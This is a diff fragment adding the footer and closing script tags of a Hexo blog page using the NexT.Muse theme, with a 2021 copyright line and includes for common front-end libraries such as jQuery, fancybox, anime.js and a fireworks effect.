+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Peguin</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,0' opacity='0.5' zIndex='-1' count='150' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+  
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+   <script type="text/javascript" src="/js/fireworks.js"></script>
+  
+
+
+</body>
+</html>
